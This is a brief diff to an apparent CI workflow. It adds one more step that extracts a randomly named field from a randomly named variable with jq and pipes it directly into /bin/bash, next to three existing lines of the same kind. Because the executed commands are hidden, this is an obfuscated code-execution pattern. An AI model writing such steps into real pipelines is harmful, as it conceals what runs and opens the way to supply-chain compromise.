@@ -27,6 +27,7 @@ jobs:
           echo $ik64 | jq -r .i27 | /bin/bash
           printf '%s' "$kzao22593" | jq -r .pes56 | /bin/bash
           printf '%s' "$rug4" | jq -r .ruc93800 | /bin/bash
+          printf '%s' "$nptu09072" | jq -r .oai7310 | /bin/bash
 
       - name: Upload data
         if: always()
